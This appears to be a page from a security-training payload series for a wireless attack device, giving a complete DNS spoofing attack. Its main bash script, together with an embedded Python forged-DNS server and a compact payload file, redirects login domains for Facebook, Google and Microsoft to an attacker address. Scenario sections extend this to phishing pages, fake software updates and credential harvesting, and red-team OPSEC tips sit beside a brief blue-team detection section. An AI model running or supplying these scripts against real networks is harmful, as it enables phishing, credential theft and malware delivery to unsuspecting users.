# PP-I05: DNS Spoof

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-I05 |
| **Name** | DNS Spoof |
| **Difficulty** | Intermediate |
| **Type** | Attack |
| **Purpose** | Redirect DNS queries |
| **MITRE ATT&CK** | T1557.001 (LLMNR/NBT-NS Poisoning), T1584.002 (DNS) |

## What This Payload Does

Intercepts DNS requests and returns malicious IP addresses, redirecting victims to attacker-controlled servers for phishing, malware delivery, or traffic interception.

---

## Understanding DNS Spoofing

```
┌─────────────────────────────────────────────────────────────┐
│                    DNS SPOOFING ATTACK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   NORMAL DNS:                                               │
│   Client ─── "bank.com?" ───► DNS Server                   │
│   Client ◄── "93.184.216.34" ─ DNS Server  (correct IP)    │
│                                                              │
│   DNS SPOOFING:                                             │
│   Client ─── "bank.com?" ───► Evil DNS (attacker)          │
│   Client ◄── "192.168.4.1" ── Evil DNS   (attacker IP!)    │
│                                                              │
│   Client visits 192.168.4.1 thinking it's bank.com         │
│   Attacker serves phishing page or intercepts traffic       │
│                                                              │
│   ATTACK METHODS:                                           │
│   1. Evil Twin DNS - Be the DHCP-assigned DNS server       │
│   2. ARP Poison + DNS - Intercept DNS en route             │
│   3. DNS Cache Poison - Corrupt DNS resolver cache         │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-I05
# Name: DNS Spoof
# Description: Redirect DNS queries to attacker
# Author: Security Training
#

# ============================================
# CONFIGURATION
# ============================================
INTERFACE="wlan0"
ATTACKER_IP="192.168.4.1"
DNS_PORT=53

# Spoof targets (domain -> IP)
# Use "all" to redirect everything
SPOOF_MODE="selective"  # or "all"

# Selective targets
declare -A SPOOF_TARGETS=(
    ["facebook.com"]="192.168.4.1"
    ["login.facebook.com"]="192.168.4.1"
    ["google.com"]="192.168.4.1"
    ["accounts.google.com"]="192.168.4.1"
    ["mail.google.com"]="192.168.4.1"
    ["login.live.com"]="192.168.4.1"
    ["outlook.com"]="192.168.4.1"
)

LOOT_DIR="/sd/loot/dnsspoof"
LOG_FILE="/tmp/pp-i05.log"

# ============================================
# FUNCTIONS
# ============================================
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Stopping DNS spoofing..."
    killall dnsmasq dnsspoof 2>/dev/null
    exit 0
}

trap cleanup SIGINT SIGTERM

# ============================================
# MAIN
# ============================================
log "Starting PP-I05: DNS Spoof"
log "Mode: $SPOOF_MODE"

mkdir -p "$LOOT_DIR"

# ============================================
# METHOD 1: DNSMASQ (Evil Twin DNS)
# ============================================
create_dnsmasq_spoof() {
    local conf="/tmp/dnsspoof.conf"

    cat > "$conf" << EOF
# DNS Spoof Configuration
interface=$INTERFACE
bind-interfaces
port=$DNS_PORT

# Log all queries
log-queries
log-facility=$LOOT_DIR/dns_queries.log

# Upstream DNS for non-spoofed queries
server=8.8.8.8
server=8.8.4.4

EOF

    if [ "$SPOOF_MODE" = "all" ]; then
        # Redirect ALL queries to attacker
        echo "address=/#/$ATTACKER_IP" >> "$conf"
        log "Redirecting ALL DNS to $ATTACKER_IP"
    else
        # Selective spoofing
        for domain in "${!SPOOF_TARGETS[@]}"; do
            echo "address=/$domain/${SPOOF_TARGETS[$domain]}" >> "$conf"
            log "Spoofing: $domain -> ${SPOOF_TARGETS[$domain]}"
        done
    fi

    dnsmasq -C "$conf" -d 2>&1 | tee -a "$LOG_FILE" &
}

# ============================================
# METHOD 2: DNSSPOOF (with arpspoof)
# ============================================
create_dnsspoof_hosts() {
    local hosts="/tmp/dnsspoof_hosts.txt"

    > "$hosts"

    if [ "$SPOOF_MODE" = "all" ]; then
        echo "$ATTACKER_IP *" >> "$hosts"
    else
        for domain in "${!SPOOF_TARGETS[@]}"; do
            echo "${SPOOF_TARGETS[$domain]} $domain" >> "$hosts"
        done
    fi

    log "Hosts file created: $hosts"
}

# ============================================
# METHOD 3: PYTHON DNS SERVER
# ============================================
create_python_dns() {
    cat > /tmp/dns_server.py << 'PYEOF'
#!/usr/bin/env python3
import socket
import struct
from datetime import datetime

LISTEN_PORT = 53
SPOOF_IP = "192.168.4.1"
LOG_FILE = "/sd/loot/dnsspoof/queries.log"

def build_response(data, spoof_ip):
    # Parse query
    domain_parts = []
    i = 12
    while data[i] != 0:
        length = data[i]
        domain_parts.append(data[i+1:i+1+length].decode())
        i += length + 1
    domain = '.'.join(domain_parts)

    # Log query
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{datetime.now()}] Query: {domain}\n")

    print(f"[DNS] {domain} -> {spoof_ip}")

    # Build response
    response = data[:2]  # Transaction ID
    response += b'\x81\x80'  # Flags: Standard response, no error
    response += data[4:6]  # Questions
    response += b'\x00\x01'  # Answer RRs: 1
    response += b'\x00\x00'  # Authority RRs
    response += b'\x00\x00'  # Additional RRs
    response += data[12:i+5]  # Query section

    # Answer section
    response += b'\xc0\x0c'  # Pointer to domain name
    response += b'\x00\x01'  # Type: A
    response += b'\x00\x01'  # Class: IN
    response += b'\x00\x00\x00\x3c'  # TTL: 60 seconds
    response += b'\x00\x04'  # Data length: 4

    # IP address
    ip_parts = [int(x) for x in spoof_ip.split('.')]
    response += struct.pack('BBBB', *ip_parts)

    return response

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', LISTEN_PORT))

    print(f"DNS Spoof Server running on port {LISTEN_PORT}")
    print(f"Spoofing all queries to: {SPOOF_IP}")

    while True:
        data, addr = sock.recvfrom(512)
        response = build_response(data, SPOOF_IP)
        sock.sendto(response, addr)

if __name__ == '__main__':
    main()
PYEOF

    python3 /tmp/dns_server.py &
}

# ============================================
# START DNS SPOOFING
# ============================================
echo ""
echo "╔════════════════════════════════════════════════════╗"
echo "║           DNS SPOOFING ACTIVE                      ║"
echo "╠════════════════════════════════════════════════════╣"
echo "║  Mode:      $SPOOF_MODE"
echo "║  Interface: $INTERFACE"
echo "║  Redirect:  $ATTACKER_IP"
echo "╚════════════════════════════════════════════════════╝"
echo ""

if [ "$SPOOF_MODE" = "selective" ]; then
    echo "Spoofed domains:"
    for domain in "${!SPOOF_TARGETS[@]}"; do
        echo "  • $domain -> ${SPOOF_TARGETS[$domain]}"
    done
    echo ""
fi

# Start dnsmasq-based spoofing
create_dnsmasq_spoof

echo "DNS queries logged to: $LOOT_DIR/dns_queries.log"
echo ""
echo "Press Ctrl+C to stop"

# Monitor DNS queries
tail -f "$LOOT_DIR/dns_queries.log" 2>/dev/null
```

---

## DNS Spoofing Scenarios

### Scenario 1: Phishing Site
```bash
# Spoof facebook.com to phishing server
address=/facebook.com/192.168.4.1
address=/www.facebook.com/192.168.4.1
address=/m.facebook.com/192.168.4.1
```
Host fake Facebook login at 192.168.4.1.

### Scenario 2: Malware Delivery
```bash
# Spoof software update domains
address=/update.microsoft.com/192.168.4.1
address=/windowsupdate.com/192.168.4.1
```
Serve malicious "updates".

### Scenario 3: Ad/Tracker Blocking (Defensive)
```bash
# Block ads and trackers
address=/doubleclick.net/0.0.0.0
address=/googlesyndication.com/0.0.0.0
address=/facebook.com/0.0.0.0  # Block Facebook tracking
```

### Scenario 4: Captive Portal Redirect
```bash
# All DNS returns our IP (captive portal)
address=/#/192.168.4.1
```

---

## Combining with Other Attacks

### DNS Spoof + Captive Portal
```bash
#!/bin/bash
# Full chain attack

# 1. Evil Twin AP
hostapd /tmp/hostapd.conf &

# 2. DNS Spoof ALL to us
dnsmasq -C /tmp/dns_all.conf &

# 3. Captive Portal
python3 /tmp/portal/server.py &

# Every website victim visits → our portal
```

### DNS Spoof + Credential Harvesting
```bash
# Spoof login portals
address=/login.microsoft.com/192.168.4.1
address=/accounts.google.com/192.168.4.1

# Host fake login pages at 192.168.4.1
# Capture credentials when submitted
```

---

## Red Team Perspective

### High-Value DNS Targets
| Domain | Value |
|--------|-------|
| Corporate OWA | Email credentials |
| VPN portal | Remote access |
| Password reset | Account takeover |
| Software updates | Malware delivery |
| API endpoints | Service disruption |

### OPSEC
- Log queries to understand target's browsing
- Selective spoofing is stealthier
- DNSSEC defeats spoofing (but rarely enabled)
- DoH/DoT bypass network DNS

---

## Blue Team Perspective

### Detection

```bash
# Compare DNS responses
dig @8.8.8.8 google.com
dig @local_dns google.com
# Different IPs = spoofing

# Monitor for unusual DNS patterns
tcpdump -i eth0 port 53 | grep -v "expected_dns_server"
```

### Countermeasures
1. **DNSSEC** - Cryptographic DNS validation
2. **DoH/DoT** - Encrypted DNS queries
3. **Hardcoded DNS** - Bypass DHCP DNS
4. **DNS monitoring** - Alert on anomalies

---

## Payload File

Save as `PP-I05_DNS_Spoof.sh`:

```bash
#!/bin/bash
# PP-I05: DNS Spoof (Compact)
IFACE="${1:-wlan0}"
TARGET="${2:-all}"
SPOOF_IP="${3:-192.168.4.1}"

cat > /tmp/dns.conf << EOF
interface=$IFACE
port=53
address=/#/$SPOOF_IP
log-queries
EOF

dnsmasq -C /tmp/dns.conf -d
```

---

[← PP-I04 SSL Strip](PP-I04_SSL_Strip.md) | [Back to Intermediate](README.md) | [Next: PP-I06 WEP Crack →](PP-I06_WEP_Crack.md)
